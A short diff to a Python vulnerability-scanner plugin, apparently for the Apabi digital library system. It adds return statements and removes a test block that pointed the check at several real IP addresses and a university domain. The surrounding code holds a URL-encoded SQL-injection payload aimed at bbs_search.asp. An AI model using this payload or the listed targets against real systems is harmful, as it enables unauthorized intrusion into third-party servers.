@@ -16,6 +16,7 @@ def audit(arg):
     code2, head2, body2, errcode2, final_url2 = curl.curl2(arg + payload2)
     if code1==200 and code2==200 and len(body1)!=len(body2):
         security_hole(arg+payload1)
+        return arg
     #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103581
     payload = "dlib/bbs/bbs_search.asp?lang=gb"
     post = "key=1%27%29%20and%201%3Dconvert%28int%2C%27hen%27%2b%27tai%27%29%20and%20%28%271%27%20like%20%271"
@@ -37,11 +38,7 @@ def audit(arg):
             security_hole(arg+payload)
 
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('apabi_tasi', 'http://61.167.120.67:8083/')[1])
-    #audit(assign('apabi_tasi', 'http://210.37.2.181/')[1])
-    #audit(assign('apabi_tasi', 'http://211.81.174.133:81/')[1])
-    #audit(assign('apabi_tasi', 'http://202.117.24.8/')[1])
-    #audit(assign('apabi_tasi', 'http://ebook.nwu.edu.cn/')[1])
-    #audit(assign('apabi_tasi', 'http://210.37.2.181/')[1])
